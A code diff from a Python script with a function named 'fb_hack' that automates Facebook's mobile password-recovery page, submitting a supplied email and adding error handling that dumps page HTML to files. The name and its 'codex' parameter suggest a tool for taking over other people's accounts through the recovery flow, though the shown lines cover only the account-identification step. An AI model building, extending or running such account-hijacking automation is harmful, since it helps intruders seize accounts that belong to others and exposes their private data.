@@ -66,17 +66,31 @@ def fb_hack(email, codex):
   browser.set_handle_refresh(False)
   browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
   try:
-    browser.select_form(nr=0)
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print("1")
+    with open("outputx.html", "w") as file:
+      file.write(str(soup))
+    browser.click_link(nr=0)
   except:
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print("1")
     with open("output1.html", "w") as file:
       file.write(str(soup))
-    browser.click_link(nr=0)
-    print(browser.geturl())
-  browser.form['email'] = email
-  browser.submit()
+    sys.exit()
+  try:
+    browser.form['email'] = email
+    browser.submit()
+  except:
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print("1")
+    with open("output1.html", "w") as file:
+      file.write(str(soup))
+    print(browser.find_link())
+    print(browser.form())
+    sys.exit()
   """selection confirmation"""
   try:
     browser.select_form(nr=0)
